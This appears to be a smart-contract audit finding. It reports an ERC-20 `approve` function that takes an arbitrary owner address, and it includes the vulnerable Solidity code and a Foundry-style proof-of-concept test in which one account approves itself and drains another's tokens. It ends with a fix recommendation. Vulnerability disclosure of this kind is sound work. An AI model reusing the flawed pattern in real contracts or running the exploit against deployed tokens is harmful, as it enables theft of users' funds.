## Summary
The ERC-20 token implementation contains a critical vulnerability in the `approve` function that allows any user to approve token spending on behalf of any other user without authorization.

## Vulnerability Details
The vulnerability exists in the `approve` function implementation:

```solidity
function approve(address owner, address spender, uint256 amount) public {
    allowance[owner][spender] = amount;
    emit Approval(owner, spender, amount);
}
```

Instead of using `msg.sender` as the token owner, the function accepts an arbitrary `owner` address as a parameter. This allows any user to call the function and approve token spending for any other address without requiring permission or ownership of those tokens.

The standard ERC-20 `approve` function should only allow users to set allowances for their own tokens.

## Impact
Critical:

1. Any attacker can grant themselves unlimited spending allowance for any victim's tokens
2. The attacker can then use `transferFrom` to steal all tokens from the victim's address
3. This effectively allows unauthorized access to the entire token supply
4. No special permissions or prior token ownership is required to execute this attack

## PoC
The following test demonstrates the vulnerability:

```solidity
function test_ApprovalTakeover(uint256 _stolenAmount) public {
    _stolenAmount = bound(_stolenAmount, 1, 420420420420420420);

    vm.startPrank(alice);
    challenge.approve(bob, alice, _stolenAmount); // alice approves her own address to spend bob's tokens
    challenge.transferFrom(bob, alice, _stolenAmount); // alice transfers the stolen amount to herself
    vm.stopPrank();

    assertEq(challenge.balanceOf(alice), 420420420420420420 + _stolenAmount);
    assertEq(challenge.balanceOf(bob), 420420420420420420 - _stolenAmount);
}
```

In this proof of concept, Alice is able to:
1. Approve herself to spend Bob's tokens without Bob's consent
2. Transfer Bob's tokens to her own account
3. Successfully steal any amount of tokens from Bob's address

## Recommendation
Change the `approve` function so that it only allows the token owner to set allowances for their own tokens. This prevents unauthorized users from approving spending for other addresses.